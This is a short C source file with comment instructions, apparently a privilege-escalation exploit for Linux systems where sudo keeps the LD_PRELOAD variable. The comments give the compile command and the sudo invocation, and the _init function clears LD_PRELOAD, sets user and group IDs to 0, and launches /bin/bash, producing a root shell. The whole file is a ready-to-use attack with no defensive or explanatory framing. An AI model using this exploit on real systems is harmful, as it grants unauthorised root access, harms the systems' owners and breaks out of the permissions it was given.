// sudo -l LD_PRELOAD environment variable is intact.
// gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
// sudo LD_PRELOAD=/tmp/x.so [binary_name](binary that if you can sudo)
// id

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
